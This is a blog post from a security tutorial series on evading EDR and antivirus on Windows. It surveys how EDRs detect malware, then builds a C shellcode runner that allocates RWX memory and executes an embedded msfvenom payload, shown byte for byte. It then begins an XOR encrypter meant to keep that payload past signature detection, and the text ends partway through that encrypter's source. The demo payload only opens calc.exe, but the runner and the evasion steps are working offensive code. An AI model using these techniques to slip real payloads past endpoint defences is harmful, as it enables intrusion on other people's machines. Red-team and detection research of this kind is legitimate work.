<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="EDR Evasion Part 1 - Basic Shellcode Runner" /><meta property="og:locale" content="en" /><meta name="description" content="Recently, I’ve taken a bit of a dive into EDR and AV evasion techniques, with the intent to create a tool to generate customized wrappers that can execute shellcode and bypass defenses. In this series of blog posts, I will cover the development of such a tool. I will also take the opportunity to explore EDRs and their functionality, so that we have a better understanding of what we are trying to defeat. Overall, I’ll be focusing primarily on Windows environments." /><meta property="og:description" content="Recently, I’ve taken a bit of a dive into EDR and AV evasion techniques, with the intent to create a tool to generate customized wrappers that can execute shellcode and bypass defenses. In this series of blog posts, I will cover the development of such a tool. I will also take the opportunity to explore EDRs and their functionality, so that we have a better understanding of what we are trying to defeat. Overall, I’ll be focusing primarily on Windows environments." /><link rel="canonical" href="https://tid4l.github.io/posts/EDR-Evasion-Part-1-The-Shellcode-Loader/" /><meta property="og:url" content="https://tid4l.github.io/posts/EDR-Evasion-Part-1-The-Shellcode-Loader/" /><meta property="og:site_name" content="TidalSec" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-07-03T13:15:00-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="EDR Evasion Part 1 - Basic Shellcode Runner" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-07-03T13:15:00-05:00","datePublished":"2022-07-03T13:15:00-05:00","description":"Recently, I’ve taken a bit of a dive into EDR and AV evasion techniques, with the intent to create a tool to generate customized wrappers that can execute shellcode and bypass defenses. In this series of blog posts, I will cover the development of such a tool. I will also take the opportunity to explore EDRs and their functionality, so that we have a better understanding of what we are trying to defeat. Overall, I’ll be focusing primarily on Windows environments.","headline":"EDR Evasion Part 1 - Basic Shellcode Runner","mainEntityOfPage":{"@type":"WebPage","@id":"https://tid4l.github.io/posts/EDR-Evasion-Part-1-The-Shellcode-Loader/"},"url":"https://tid4l.github.io/posts/EDR-Evasion-Part-1-The-Shellcode-Loader/"}</script><title>EDR Evasion Part 1 - Basic Shellcode Runner | TidalSec</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="TidalSec"><meta name="application-name" content="TidalSec"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avi/avi.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">TidalSec</a></div><div class="site-subtitle font-italic">Cybersecurity.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/tid4l" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>EDR Evasion Part 1 - Basic Shellcode Runner</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>EDR Evasion Part 1 - Basic Shellcode Runner</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/username">Chris</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1656872100" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-07-03 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2511 words"> <em>13 min</em> read</span></div></div></div><div class="post-content"><p>Recently, I’ve taken a bit of a dive into EDR and AV evasion techniques, with the intent to create a tool to generate customized wrappers that can execute shellcode and bypass defenses. In this series of blog posts, I will cover the development of such a tool. I will also take the opportunity to explore EDRs and their functionality, so that we have a better understanding of what we are trying to defeat. Overall, I’ll be focusing primarily on Windows environments.</p><h2 id="edr-functionality"><span class="mr-2">EDR Functionality</span><a href="#edr-functionality" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Before getting into the tool itself, let’s go over some techniques that EDRs (and some AVs) use to detect malicious code. This list isn’t all inclusive, but it includes some of the more common methods and therefore some of these will be covered in this series. Also, I’d like to note that they’re not necessarily mutually exclusive either, as some of these are used in conjunction. For instance, sandboxing can utilize other methods, such as signature detection. With that covered, let’s go through them.</p><ul><li><p><strong>Static analysis</strong></p><p>What the name implies. The AV/EDR solution analyzes the binary on disk and flags on malicious code. This ties closely to signature detection (if not a direct subset), but I’ve seperated it out for the sake of this post.</p><li><p><strong>Signature Detection</strong></p><p>Commonly used by AVs and EDRs, this functionality evaluates programs based on signatures matching previously identified malware. This can include signatures like matching file hashes or using the same chunks of code.</p><li><p><strong>Sandboxing</strong></p><p>Some AVs/EDRs will analyze a program by running it briefly in a virtual environment in an attempt to identify any malicious activity. This process can be resource intensive, however, so most solutions will only execute it for a short period of time.</p><li><p><strong>Binary Entropy</strong></p><p>EDRs can also detect malicious code by inspecting the amount of entropy, or randomness, within a binary. Higher entropy can be indicative of encryption, which is sometimes used by malicious software to hide signaturized features or capabilities.</p><li><p><strong>IAT analysis</strong></p><p>For background, all Windows portable executables (PE) contain something called the Import Address Table (IAT). Simply put, the IAT is what stores the DLL and function names that the PE file imports. Certain calls that a binary makes to the Windows API can cause an EDR to become suspicious and oftentimes these solutions will utilize this method to profile a suspect binary.</p><li><p><strong>Event Tracing</strong></p><p>Instead of statically analyzing binaries based on their contents, EDRs and AVs can also inspect the events that occur when a binary executes. By tracing the events, as the name suggests, EDRs can determine if the intent is malicious. Windows includes this feature built-in, known as <a href="https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing">Event Tracing for Windows (ETW)</a>.</p><li><p><strong>Heuristic analysis</strong></p><p>Heuristic, or behavioral, analysis is a broad, catch-all term for EDR investigation that attempts to identify novel malicious software, which was previously unknown. This encompasses some of the other already mentioned methods, but it’s worth mentioning here.</p><li><p><strong>In-memory scanning</strong></p><p>After a malicious binary has gained execution, EDRs and AVs can still retroactively defeat it by identifying its malicious intent in-memory. Typically, the EDR solution does this similarly to how it performs static anaylsis. For this technique, it’s important to note that usually the EDR or AV are only looking at executable memory, as this is the more dangerous segment for malware to reside.</p><li><p><strong>API Hooking</strong></p><p>Another way that EDRs will monitor a binary is by loading its own DLL into the process upon start up, where it will monitor for suspicious function calls. The EDR “hooks” into these functions, acting as a intermediary between the program and the WinAPI. If the process attempts to call a function for malicious purposes, the EDR will respond.</p></ul><h2 id="basic-shellcode-runner"><span class="mr-2">Basic Shellcode Runner</span><a href="#basic-shellcode-runner" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Okay, now that we’ve covered some EDR/AV basics, let’s jump into creating our shellcode runner.</p><blockquote class="prompt-tip"><div><p>Remember, the purpose of a runner is to execute malicious code and bypass automated defenses. Ultimately, we are using a shellcode runner to get our malicious code, the payload, into memory without the need to alter the payload itself. A shellcode runner will provide us a lot of flexibility and options for AV/EDR evasion.</p></div></blockquote><p>The shellcode we’ll use just pops calc.exe as a proof-of-concept, but in the end we’ll verify our runner will still work with larger payloads, too. Using msfvenom, let’s generate some shellcode. Since we’ll make our runner in C, we’ll use the C output format. Although it’s good to know how to write shellcode, that isn’t the focus here.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>msfvenom <span class="nt">-a</span> x64 <span class="nt">--platform</span> windows <span class="nt">-p</span> windows/x64/exec <span class="nv">cmd</span><span class="o">=</span>calc.exe <span class="nt">-f</span> c
</pre></table></code></div></div><p>Okay, we’ll save that for later. Now, let’s start building our program. As the first iteration, it’ll be quite simple. Essentially, we want to:</p><ol><li>Allocate some executable memory for our shellcode. For this we will use the WinAPI function, <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>.<li>Copy our shellcode to that space in memory using the address we received from our <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> call.<li>Execute the shellcode.</ol><p>In theory, this is pretty straight forward. In practice, however, automated defenses may present some issues. Regardless, let’s start putting the code together.</p><p>At the top we’ll initialize our shellcode variable <strong>sc</strong> as a character string. After we’ll use <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> to carve out our executable memory, the same amount of bytes as our shellcode. More info can on this function can be found in the <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">Microsoft Documentation</a>.</p><div class="language-c nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="o">*</span><span class="n">exec</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">sc</span><span class="p">,</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
</pre></table></code></div></div><p>This returns a pointer to the start address of this newly allocated memory space. Let’s use the <code class="language-plaintext highlighter-rouge">memcpy</code> function to copy our shellcode to this memory address.</p><div class="language-c nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">memcpy</span><span class="p">(</span><span class="n">exec</span><span class="p">,</span> <span class="n">sc</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">sc</span><span class="p">);</span>
</pre></table></code></div></div><p>Now that we have our shellcode in executable memory, we’ve just got to execute it. This is where it gets a bit tricky and we’ll have to use a somewhat hacky way to get it started. The line we’ll use is:</p><div class="language-c nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">((</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">exec</span><span class="p">)();</span>
</pre></table></code></div></div><p>Okay… So if you’re not familiar with this line, this forces the program to point to the address of our shellcode as the next instruction. Casting exec to a function which takes no arguments and returns void, then calling said function will do just that.</p><p>That’s it! For now. This will execute whatever shellcode we use.</p><p>Here’s <code class="language-plaintext highlighter-rouge">runner.c</code> put together:</p><div file="runner.c" class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="runner.c"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
    
    <span class="kt">char</span> <span class="n">sc</span><span class="p">[]</span> <span class="o">=</span> 
    <span class="s">"</span><span class="se">\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x63\x2e\x65\x78\x65\x00</span><span class="s">"</span><span class="p">;</span>

    <span class="kt">void</span> <span class="o">*</span><span class="n">exec</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">sc</span><span class="p">,</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
    
    <span class="n">memcpy</span><span class="p">(</span><span class="n">exec</span><span class="p">,</span> <span class="n">sc</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">sc</span><span class="p">);</span>
    
    <span class="p">((</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">exec</span><span class="p">)();</span>
<span class="p">}</span>
</pre></table></code></div></div><p>At this point, there are couple things I’d like to point out. Our call to <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> is requesting read/write execute (RWX). Few non-malicious programs request this type of memory protection, so this is already pretty suspicious. Additionally, our shellcode is built into the binary, in plain hexadecimal. As an msfvenom generated payload, it’s most likely signatured by AV. Regardless, let’s give it a shot.</p><h3 id="testing-the-runner"><span class="mr-2">Testing the Runner</span><a href="#testing-the-runner" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>To start testing, we’ll compile our runner. Right away, if your using a Windows host, Defender is going to flag on the resulting executable. Creating a folder or file exception and executing starts calc.exe, so we know the runner works.</p><p><img data-src="/assets/img/posts/07-2022/v1.png" alt="v1 Alert" data-proofer-ignore> <em>Defender alerts on the shellcode’s signature.</em></p><p>Opening the alert, it looks like Windows Defender is flagging on an AV signature of the msfvenom shellcode, as expected. If our runner can’t bypass Windows AV, it doesn’t stand a chance getting passed an EDR solution.</p><p>Let’s explore a potential solution and our first bypass.</p><h2 id="evasion-encrypted-shellcode"><span class="mr-2">Evasion: Encrypted Shellcode</span><a href="#evasion-encrypted-shellcode" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Now that we’ve got a foundation for our runner, we’re going to modify it to include a shellcode decoder. Because our current solution is signatured, AV catches it, running or not. To disrupt this static analysis, we will have our shellcode encrypted while at rest. This should help our binary live on disk and may allow execution to occur without detection. For simplicity’s sake, let’s use an <a href="https://en.wikipedia.org/wiki/XOR_cipher">XOR cipher</a> to encrypt our shellcode.</p><p>To do this properly, we’ll have to create a seperate encrypter binary that generates the encrypted.bin shellcode file. In future versions, we can make this all nice and pretty by making the encrypter also build our runner binary with the encrypted shellcode built-in, but for now, let’s just have it output this file for the runner to read in.</p><hr /><h3 id="the-encypter"><span class="mr-2">The Encypter</span><a href="#the-encypter" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Let’s get started. First, we’ll create our encrypter. This will be a pretty bare solution, error handling and other best practices will be resolved later.</p><p>After initializing our variables, we’ll need to access our two files: one is where we’ll read in our shellcode, shellcode.bin, and the other is where we’ll write our encrypted shellcode, enc.bin. These files will reside in the same directory as our encypter. Since we’ll be reading/writing binary files, we’ll use the <code class="language-plaintext highlighter-rouge">b</code> mode. If enc.bin doesn’t exist, the program will create it.</p><p>Additionally, we’ll get the statistics of our shellcode file so we know how much memory we need to allocate.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">enc_file</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"enc.bin"</span><span class="p">,</span> <span class="s">"wb+"</span><span class="p">);</span>
<span class="n">sc_file</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"shellcode.bin"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">);</span>

<span class="n">stat</span><span class="p">(</span><span class="s">"shellcode.bin"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stats</span><span class="p">);</span>
</pre></table></code></div></div><p>Once we have our stats, we’ll initialize and allocate memory for two character arrays, which will store both the raw binary from the shellcode file and the encrypted output. After, we’ll read the data in from the shellcode.bin file.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="kt">char</span><span class="o">*</span> <span class="n">sc</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">stats</span><span class="p">.</span><span class="n">st_size</span><span class="p">);</span>
<span class="kt">char</span><span class="o">*</span> <span class="n">sc_xor</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">stats</span><span class="p">.</span><span class="n">st_size</span><span class="p">);</span>

<span class="n">fread</span><span class="p">(</span><span class="n">sc</span><span class="p">,</span> <span class="n">stats</span><span class="p">.</span><span class="n">st_size</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">sc_file</span><span class="p">);</span>
</pre></table></code></div></div><p>We’ll loop through the shellcode size, where we will XOR each byte by the key, which we initialized as 5. In most languages, the XOR operator is <code class="language-plaintext highlighter-rouge">^</code>.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">printf</span><span class="p">(</span><span class="s">"Encrypting shellcode...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">stats</span><span class="p">.</span><span class="n">st_size</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
    <span class="n">sc_xor</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">sc</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>After encrypting the shellcode, all we need to do now is write it to the file we created earlier, enc.bin. Finally, we’ll close our files and free the memory we’ve allocated. All together, our shellcode encryptor looks like:</p><div file="encrypter.c" class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="encrypter.c"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>

    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">key</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
    <span class="kt">FILE</span> <span class="o">*</span><span class="n">enc_file</span><span class="p">;</span>
    <span class="kt">FILE</span> <span class="o">*</span><span class="n">sc_file</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">stat</span> <span class="n">stats</span><span class="p">;</span>

    <span class="n">enc_file</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"enc.bin"</span><span class="p">,</span> <span class="s">"wb+"</span><span class="p">);</span>
    <span class="n">sc_file</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"shellcode.bin"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">);</span>

    <span class="n">stat</span><span class="p">(</span><span class="s">"shellcode.bin"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stats</span><span class="p">);</span>

    <span class="kt">char</span><span class="o">*</span> <span class="n">sc</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">stats</span><span class="p">.</span><span class="n">st_size</span><span class="p">);</span>
    <span class="kt">char</span><span class="o">*</span> <span class="n">sc_xor</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">stats</span><span class="p">.</span><span class="n">st_size</span><span class="p">);</span>

    <span class="n">fread</span><span class="p">(</span><span class="n">sc</span><span class="p">,</span> <span class="n">stats</span><span class="p">.</span><span class="n">st_size</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">sc_file</span><span class="p">);</span>

